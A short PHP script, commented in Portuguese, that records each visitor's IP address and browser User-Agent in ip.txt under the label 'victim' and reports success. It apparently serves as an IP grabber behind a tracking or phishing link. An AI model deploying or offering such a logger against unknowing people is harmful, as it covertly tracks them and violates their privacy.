<?php

// Obter o IP do usuário
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

// Obter o User-Agent do navegador do usuário
$useragent = $_SERVER['HTTP_USER_AGENT'];

// Salvar o IP e User-Agent em um arquivo
$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');
fwrite($fp, $victim);
fwrite($fp, $ipaddress . "\r\n");
fwrite($fp, $useragent . "\r\n");
fclose($fp);

// Enviar resposta para o cliente
echo "Informações obtidas com sucesso.";
?>
